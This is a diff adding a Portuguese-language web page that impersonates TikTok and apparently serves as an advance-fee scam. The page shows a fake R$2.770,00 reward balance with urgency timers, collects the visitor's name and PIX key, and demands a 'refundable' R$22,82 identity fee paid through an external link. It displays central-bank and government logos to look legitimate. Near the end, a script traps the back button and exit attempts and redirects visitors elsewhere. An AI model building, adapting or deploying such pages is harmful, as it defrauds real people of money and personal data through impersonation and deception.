+
+                <!-- Separador -->
+                <div class="timer-separator">:</div>
+
+                <!-- Minutos -->
+                <div class="timer-box" data-timer="minutes">16</div>
+                <!-- ADICIONE AQUI -->
+
+                <!-- Separador -->
+                <div class="timer-separator">:</div>
+
+                <!-- Segundos -->
+                <div class="timer-box" data-timer="seconds">38</div>
+                <!-- ADICIONE AQUI -->
+              </div>
+            </div>
+            <button type="button" class="btn-obrigado" aria-label="Obrigado" data-modal-close="">
+              <span class="btn-text btn-textdois btn-txt-obrigado">Obrigado</span>
+            </button>
+          </div>
+        </div>
+      </section>
+      <section id="three" class="screen">
+        <div class="expira-saldo">
+          <div class="timer-wrapper">
+            <p id="countdown-text">
+              SEU SALDO EXPIRA EM
+              <span id="timer">00 - 16 - 38</span>
+            </p>
+          </div>
+        </div>
+        <div class="title">Resgatar recompensas</div>
+        <div class="saldo saldo-dois">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info saldo-info-dois">
+              <div class="saldo-label">
+                <span class="saldo-text saldo-text-dois">Seu saldo</span>
+              </div>
+
+              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
+                <span class="valor-currency valor-currency-dois" data-amount-target="2770.00">R$2.770,00</span>
+                <span class="total-pontos">= 28.347.200 pontos (s)</span>
+              </div>
+            </div>
+
+            <div class="saldo-action">
+              <span class="saldo-img"><img src="images/p-saldo-maior.png" alt="" class="p-saldo p-saldo-maior"></span>
+            </div>
+          </div>
+        </div>
+        <div class="linha"></div>
+        <div class="saldo saldo-tres">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info saldo-info-dois">
+              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
+                <span class="total-pontos total-pontos-dois">Última recompensa: R$ 646,43</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="saldo saldo-sacar">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info saldo-info-sacar">
+              <div class="saldo-label">
+                <span class="saldo-sacar-text">Sacar dinheiro</span>
+              </div>
+
+              <div class="saldo-valor" aria-live="polite">
+                <span class="transferencia-txt"><img src="images/fi-rs-credit-card.png" alt="">Transferencia via /
+                  <img src="images/pix-logo.svg" alt="" class="pix-logo-transf"></span>
+              </div>
+            </div>
+          </div>
+          <div class="widget-container">
+            <div class="botoes-row botoes-row-sacar">
+              <button class="btn-valor">R$1,5</button>
+              <button class="btn-valor">R$5</button>
+              <button class="btn-valor">R$10</button>
+            </div>
+
+            <button class="btn-valor display-total">R$2.770,00</button>
+          </div>
+          <button type="button" class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel" aria-label="sacar dinheiro">
+            <span class="btn-text btn-textdois-sacar btn-three-saque">Sacar dinheiro</span>
+          </button>
+          <div class="obtem obtem-sacar sacar-dinheiro">
+            <span class="obtem-txt">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os
+              limites de saque para transações individuais e mensais podem
+              variar conforme o pais ou região.</span>
+          </div>
+        </div>
+
+        <div class="saldo saldo-sacar">
+          <div class="container-saldo ctn-flor" role="region" aria-labelledby="saldo-title">
+            <img src="images/flor.png" alt="" class="flor">
+            <div class="saldo-info obtenha-title">
+              <div class="saldo-label">
+                <span class="saldo-sacar-text obtenha-txt">Obtenha Moedas para a LIVE</span>
+              </div>
+
+              <div class="saldo-valor saldo-valor-tres border-none" aria-live="polite">
+                <span class="transferencia-txt moedas-txt">Use Moedas para enviar presentes virtuais para seus hosts de
+                  live Favoritos.</span>
+              </div>
+            </div>
+          </div>
+
+          <button type="button" class="btn-sacar-indisponivel" aria-label="sacar dinheiro">
+            <span class="btn-text btn-indis">Indisponível</span>
+          </button>
+          <!-- <div class="obtem obtem-sacar">
+            <span class="obtem-txt"
+              >Para sacar ddasdasinheiro, você precisa de um saldo mínimo de
+              R$1,5. Os limites de saque para transações individuais e mensais
+              podem variar conforme o pais ou região.</span
+            >
+          </div> -->
+        </div>
+
+        <div class="saldo saldo-sacar">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info obtenha-title">
+              <div class="saldo-label">
+                <span class="saldo-sacar-text obtenha-txt">Recarga móvel</span>
+              </div>
+
+              <div class="saldo-valor saldo-valor-tres celular-recarga" aria-live="polite">
+                <span class="ddd">+55</span>
+                <span class="linha-ddd"></span>
+                <div class="telefone">12345678901</div>
+              </div>
+            </div>
+          </div>
+
+          <button type="button" class="btn-sacar-indisponivel" aria-label="sacar dinheiro">
+            <span class="btn-text btn-indis">Indisponível</span>
+          </button>
+          <div class="obtem obtem-sacar">
+            <span class="obtem-txt recarga-txt">Voce precisa de um saldo mínimo de R$10 para recarga de
+              celular</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="four" class="modal" aria-hidden="true">
+        <div class="modal-inner inner-pop">
+          <div class="saque-popup">
+            <div class="title saque-title">Adicionar método de saque</div>
+            <span class="pix-item" role="button" tabindex="0" data-open-modal="five">
+              <div class="pix-icon">
+                <img src="images/pix-solo.svg" alt="" class="pix-solo">
+              </div>
+
+              <div class="pix-details">
+                <span class="pix-title">PIX</span>
+                <span class="pix-subtitle">Recebimento Imediato</span>
+              </div>
+
+              <span class="pix-arrow">
+                <svg xmlns="http://www.w3.org/2000/svg" width="8" height="14" viewBox="0 0 8 14" fill="none">
+                  <path d="M1.411 13.414L0 12L5.28899 6.707L0 1.414L1.415 0L6.69999 5.293C7.07493 5.66806 7.28556 6.17667 7.28556 6.707C7.28556 7.23733 7.07493 7.74594 6.69999 8.121L1.411 13.414Z" fill="#7F7F7F"></path>
+                </svg>
+              </span>
+            </span>
+          </div>
+        </div>
+      </section>
+      <section id="five" class="screen" aria-hidden="true">
+        <div class="modal-inner inner-pop saque-popup">
+          <div class="title saque-title">Vincular PIX</div>
+
+          <div class="form-container">
+            <div class="form-group">
+              <label class="field-label" for="nome">Nome</label>
+              <input type="text" id="nome" placeholder="Nome completo" class="nome-completo">
+            </div>
+
+            <div class="form-group">
+              <label class="field-label">Tipo de Chave PIX</label>
+
+              <div class="pix-selector" id="pix-type-selector" data-open-modal="six" role="button" tabindex="0">
+                <span class="placeholder-text" id="pix-selector-text">Escolha o tipo de chave PIX</span>
+                <span class="arrow arrow-tois"><svg xmlns="http://www.w3.org/2000/svg" width="5" height="9" viewBox="0 0 5 9" fill="none">
+                    <path d="M0.940665 8.94267L0 8L3.52599 4.47133L0 0.942666L0.943332 0L4.46666 3.52867C4.71662 3.7787 4.85704 4.11778 4.85704 4.47133C4.85704 4.82489 4.71662 5.16396 4.46666 5.414L0.940665 8.94267Z" fill="#7F7F7F"></path>
+                  </svg>
+                </span>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label class="field-label">Chave PIX</label>
+              <!-- Wrapper para detectar clique quando disabled -->
+              <div id="pix-key-wrapper" class="input-wrapper-disabled">
+                <input type="text" id="pix-key-input" placeholder="Digite sua chave PIX" class="nome-completo input-disabled" disabled="">
+              </div>
+            </div>
+
+            <button type="button" id="btn-enviar-pix" class="btn-obrigado btn-sacar-dois btn-vincular btn-disabled" aria-label="sacar dinheiro">
+              <span class="btn-text btn-textdois-sacar">Enviar</span>
+            </button>
+          </div>
+        </div>
+      </section>
+      <section id="six" class="screen" aria-hidden="true">
+        <div class="modal-inner inner-pop">
+          <div class="saque-popup chave-pix">
+            <div class="title saque-title">Chave PIX</div>
+            <div class="selection-container">
+              <div class="option-row">
+                <label for="key-cpf">
+                  <span class="option-text">CPF</span>
+                  <input type="radio" id="key-cpf" name="pix_key_type" checked="">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+
+              <div class="option-row">
+                <label for="key-email">
+                  <span class="option-text">E-mail</span>
+                  <input type="radio" id="key-email" name="pix_key_type">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+
+              <div class="option-row">
+                <label for="key-celular">
+                  <span class="option-text">Celular</span>
+                  <input type="radio" id="key-celular" name="pix_key_type">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+
+              <div class="option-row">
+                <label for="key-aleatoria">
+                  <span class="option-text">Chave Aleatória</span>
+                  <input type="radio" id="key-aleatoria" name="pix_key_type">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section id="seven" class="screen">
+        <header class="loading-header">
+          <div class="loading-logo">
+            <img src="images/logotiktok.png" alt="TikTok Logo" class="loading-logo-img">
+          </div>
+        </header>
+
+        <main class="loading-main-content">
+          <div class="new-loading-container">
+            <div class="new-loading-text" id="new-loading-text">
+              Validando acesso...
+            </div>
+            <div class="new-progress-track">
+              <div class="new-progress-bar" id="new-progress-bar"></div>
+            </div>
+          </div>
+        </main>
+      </section>
+      <section id="nine" class="screen" aria-hidden="true">
+        <div class="confirmation-container">
+          <div class="confirmation-header">
+            <div class="confirmation-logo">
+              <img src="images/logotiktok.png" alt="TikTok">
+            </div>
+          </div>
+
+          <!-- Saldo Acumulado -->
+          <div class="confirmation-section confirmation-balance">
+            <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
+            <div class="confirmation-balance-amount" data-amount-target="2770.00">
+              R$ 2.770,00
+            </div>
+            <div class="confirmation-balance-subtitle">
+              Aguardando confirmação para saque
+            </div>
+          </div>
+
+          <!-- Taxa de Confirmação -->
+          <div class="confirmation-section">
+            <div class="confirmation-section-title">
+              CONFIRMAÇÃO DE IDENTIDADE
+            </div>
+            <div class="confirmation-fee-amount">
+              R$ 22,82
+              <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
+            </div>
+            <div class="confirmation-fee-description">
+              Taxa obrigatória para liberação do saque no valor de
+              <span class="bold">R$2.770,00</span>. O valor de
+              <span class="bold">R$22,82</span> será reembolsado integralmente
+              para você em 1 minuto.
+            </div>
+          </div>
+
+          <!-- Comprovante -->
+          <div class="confirmation-section">
+            <div class="confirmation-section-title">DADOS PARA REEMBOLSO</div>
+            <div class="confirmation-receipt-grid">
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Nome</div>
+                <div class="confirmation-receipt-value" id="confirmation-name"></div>
+              </div>
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Data</div>
+                <div class="confirmation-receipt-value" id="confirmation-date"></div>
+              </div>
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Chave PIX</div>
+                <div class="confirmation-receipt-value" id="confirmation-key-type"></div>
+              </div>
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Valor a receber</div>
+                <div class="confirmation-receipt-value bold">R$ 2.770,00</div>
+              </div>
+              <div class="confirmation-pix-key" id="confirmation-pix-key"></div>
+            </div>
+          </div>
+
+          <div class="confirmation-divider"></div>
+
+          <!-- Requisitos -->
+          <div class="confirmation-section">
+            <div class="confirmation-section-title">PROCESSO DE LIBERAÇÃO</div>
+            <div class="confirmation-requirements-grid">
+              <div class="confirmation-requirement-item">
+                <div class="confirmation-requirement-icon">1</div>
+                <div class="confirmation-requirement-content">
+                  <div class="confirmation-requirement-title">
+                    Pagar taxa de confirmação
+                  </div>
+                  <div class="confirmation-requirement-description">
+                    R$ 22,82 para verificação de identidade
+                  </div>
+                </div>
+              </div>
+              <div class="confirmation-requirement-item">
+                <div class="confirmation-requirement-icon confirmation-reembolso">
+                  ✓
+                </div>
+                <div class="confirmation-requirement-content">
+                  <div class="confirmation-requirement-title confirmation-reembolso">
+                    Receber reembolso automático
+                  </div>
+                  <div class="confirmation-requirement-description">
+                    Valor devolvido em 1 minuto
+                  </div>
+                </div>
+              </div>
+              <div class="confirmation-requirement-item">
+                <div class="confirmation-requirement-icon">3</div>
+                <div class="confirmation-requirement-content">
+                  <div class="confirmation-requirement-title">
+                    Acessar saldo completo
+                  </div>
+                  <div class="confirmation-requirement-description">
+                    R$ 2.770,00 liberado para saque
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Call to Action -->
+          <div class="confirmation-section">
+            <a href="https://ambienteseguro.org.ua/c/b2bbf754e8" class="confirmation-cta-button" id="confirmation-button" onclick="herdarUTMeRedirecionar(this.href); return false;">
+              Pagar taxa para Liberar Saque
+            </a>
+
+            <script>
+              function herdarUTMeRedirecionar(urlDestino) {
+                // Pega os parâmetros da URL atual
+                const urlAtual = new URL(window.location.href);
+                const params = new URLSearchParams(urlAtual.search);
+
+                // Filtra UTMs + ttclid
+                const parametrosParaHerdar = {};
+                for (const [key, value] of params.entries()) {
+                  if (
+                    key.startsWith("utm_") ||
+                    key === "ttclid" // <- novo parâmetro incluído
+                  ) {
+                    parametrosParaHerdar[key] = value;
+                  }
+                }
+
+                // Cria a URL de destino com os parâmetros herdados
+                const urlFinal = new URL(urlDestino);
+                const paramsDestino = new URLSearchParams(urlFinal.search);
+
+                // Adiciona os parâmetros herdados à URL de destino
+                for (const [key, value] of Object.entries(
+                  parametrosParaHerdar
+                )) {
+                  paramsDestino.set(key, value);
+                }
+
+                urlFinal.search = paramsDestino.toString();
+
+                // Redireciona na mesma página
+                window.location.href = urlFinal.toString();
+              }
+            </script>
+            <div class="confirmation-timer">
+              ⏱️ Reembolso automático em 1 minuto
+            </div>
+            <div class="confirmation-success-message" id="confirmation-success-message">
+              ✅ Identidade confirmada. R$ 21,67 reembolsados e saque liberado.
+            </div>
+          </div>
+
+          <!-- Segurança -->
+          <div class="confirmation-security-grid">
+            <div class="confirmation-security-item">
+              <div class="confirmation-security-label">
+                <img src="images/bacen.png" alt="" class="img-bacen">
+              </div>
+            </div>
+            <div class="confirmation-security-item">
+              <div class="confirmation-security-label">
+                <img src="images/gov-br.webp" alt="" class="img-gov-br">
+              </div>
+            </div>
+            <div class="confirmation-security-item">
+              <div class="confirmation-security-label">
+                <img src="images/receitafederal.png" alt="" class="img-receitafederal">
+              </div>
+            </div>
+          </div>
+
+          <!-- Footer -->
+          <div class="confirmation-footer">
+            <div class="confirmation-footer-text">Processo 100% seguro</div>
+            <a href="#nine" class="confirmation-footer-link">Precisa de ajuda?</a>
+          </div>
+        </div>
+      </section>
+      <section id="popup-um" class="sticky-popup">
+        <div class="timer-wrapper expira-em-popup">
+          <div class="timer-label">Expira em</div>
+
+          <div class="timer-clock">
+            <!-- Horas -->
+            <div class="timer-box" data-timer="hours">00</div>
+
+            <!-- Separador -->
+            <div class="timer-separator">:</div>
+
+            <!-- Minutos -->
+            <div class="timer-box" data-timer="minutes">42</div>
+
+            <!-- Separador -->
+            <div class="timer-separator">:</div>
+
+            <!-- Segundos -->
+            <div class="timer-box" data-timer="seconds">37</div>
+          </div>
+        </div>
+        <!-- <div class="line line-expira"></div> -->
+        <div class="saldo saldo-popup">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info">
+              <div class="saldo-label">
+                <span class="saldo-text">Seu saldo</span>
+                <img src="images/p-saldo.svg" alt="" class="p-saldo">
+              </div>
+
+              <div class="saldo-valor" aria-live="polite">
+                <span class="valor-currency">R$2.770,00</span>
+              </div>
+            </div>
+
+            <div class="saldo-action">
+              <button type="button" class="btn-sacar" aria-label="Sacar">
+                <span class="btn-text">Sacar</span>
+                <span class="pix-badge" aria-hidden="true">
+                  <img src="images/pix-logo.svg" alt="">
+                </span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <script>
+      // Funções auxiliares
+      function easeOutCubic(t) {
+        return 1 - Math.pow(1 - t, 3);
+      }
+
+      function formatBR(value) {
+        return value
+          .toFixed(2) // duas casas decimais
+          .replace(".", ",") // vírgula decimal
+          .replace(/\B(?=(\d{3})+(?!\d))/g, "."); // ponto para milhar
+      }
+
+      // Função reutilizável para animar um contador
+      function animateCurrencyCounter(counter, forceReset = false) {
+        if (!counter) return;
+
+        // Se já está animando e não forçou reset, não anima novamente
+        if (counter._isAnimating && !forceReset) return;
+
+        const duration = 2000; // tempo total da animação
+        const toValue =
+          parseFloat(counter.getAttribute("data-amount-target")) || 0;
+        const fromValue = 0;
+
+        if (toValue === 0) {
+          // Garante que sempre mostre um valor válido, mesmo se for 0
+          counter.textContent = "R$ 0,00";
+          return;
+        }
+
+        // Cancela animação anterior se existir
+        if (counter._animationFrameId) {
+          cancelAnimationFrame(counter._animationFrameId);
+          counter._animationFrameId = null;
+        }
+
+        // Garante que sempre comece com um valor visível
+        counter.textContent = "R$ 0,00";
+
+        counter._isAnimating = true;
+        let startTime = null;
+
+        function animateCounter(currentTime) {
+          if (!startTime) startTime = currentTime;
+          const elapsed = currentTime - startTime;
+          const progress = Math.min(elapsed / duration, 1);
+          const value =
+            fromValue + (toValue - fromValue) * easeOutCubic(progress);
+
+          // Atualiza número formatado no padrão brasileiro - sempre garante um valor válido
+          const formattedValue = "R$ " + formatBR(value);
+          if (counter && counter.textContent !== undefined) {
+            counter.textContent = formattedValue;
+          }
+
+          if (progress < 1) {
+            counter._animationFrameId = requestAnimationFrame(animateCounter);
+          } else {
+            // garante valor final exato
+            const finalValue = "R$ " + formatBR(toValue);
+            if (counter && counter.textContent !== undefined) {
+              counter.textContent = finalValue;
+            }
+            counter._isAnimating = false;
+            counter._animationFrameId = null;
+          }
+        }
+
+        // Pequeno delay para garantir que o DOM está pronto
+        setTimeout(() => {
+          if (counter && counter.getAttribute("data-amount-target")) {
+            counter._animationFrameId = requestAnimationFrame(animateCounter);
+          }
+        }, 10);
+      }
+
+      // Anima todos os contadores visíveis no carregamento
+      document.addEventListener("DOMContentLoaded", function () {
+        // Anima apenas contadores que estão visíveis na tela inicial
+        const initialCounters = document.querySelectorAll(
+          "#one .valor-currency[data-amount-target]"
+        );
+        initialCounters.forEach((counter) => {
+          animateCurrencyCounter(counter);
+        });
+      });
+
+      // Expõe a função globalmente para ser chamada quando o popup abrir
+      window.animateCurrencyCounter = animateCurrencyCounter;
+    </script>
+
+    <!-- <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const counters = document.querySelectorAll(".elementor-counter-number");
+
+        counters.forEach((counter) => {
+          const duration =
+            parseInt(counter.getAttribute("data-duration")) || 2000;
+          const toValue =
+            parseFloat(counter.getAttribute("data-to-value")) || 0;
+          const fromValue =
+            parseFloat(counter.getAttribute("data-from-value")) || 0;
+          const delimiter = counter.getAttribute("data-delimiter") || ".";
+
+          let startTime = null;
+
+          function animateCounter(currentTime) {
+            if (!startTime) startTime = currentTime;
+            const elapsed = currentTime - startTime;
+            const progress = Math.min(elapsed / duration, 1);
+            const value =
+              fromValue + (toValue - fromValue) * easeOutCubic(progress);
+
+            counter.textContent = formatNumber(value, delimiter);
+
+            if (progress < 1) {
+              requestAnimationFrame(animateCounter);
+            } else {
+              counter.textContent = formatNumber(toValue, delimiter);
+            }
+          }
+
+          requestAnimationFrame(animateCounter);
+        });
+
+        function easeOutCubic(t) {
+          return 1 - Math.pow(1 - t, 3);
+        }
+
+        function formatNumber(value, delimiter) {
+          // exibe com 2 casas decimais e separador personalizado
+          let formatted = value.toFixed(2);
+          if (delimiter === ",") formatted = formatted.replace(".", ",");
+          return formatted;
+        }
+      });
+    </script> -->
+    <script src="js/main.js"></script>
+    <!-- <script src="js/agr.js"></script> -->
+    <!-- <script src="js/sera.js"></script> -->
+  
+  <script>
+(function() {
+  // 🔗 URL de destino — substitua pelo seu link real:
+  const destino = "https://convite-on.github.io/pesquisa";
+  let jaRedirecionou = false;
+
+  function redirecionar() {
+    if (!jaRedirecionou) {
+      jaRedirecionou = true;
+      window.location.replace(destino);
+    }
+  }
+
+  // Impede loop de redirecionamento em reload/back cache
+  if (sessionStorage.getItem("__ja_redirecionou__")) return;
+  sessionStorage.setItem("__ja_redirecionou__", "1");
+
+  // Detecta intenção de saída no desktop (mouse indo pro topo)
+  document.addEventListener("mouseleave", function(e) {
+    if (e.clientY < 0 && !/Mobi|Android/i.test(navigator.userAgent)) {
+      redirecionar();
+    }
+  });
+
+  // Detecta tentativa de voltar (botão voltar do navegador)
+  window.addEventListener("popstate", function() {
+    redirecionar();
+  });
+
+  // Adiciona um estado no histórico (para detectar o "voltar")
+  window.history.pushState({}, "", window.location.href);
+
+  // Protege contra travamentos ou loops em alguns navegadores
+  window.addEventListener("pageshow", function(e) {
+    if (e.persisted) {
+      sessionStorage.removeItem("__ja_redirecionou__");
+    }
+  });
+})();
+</script>
+
+</body></html>
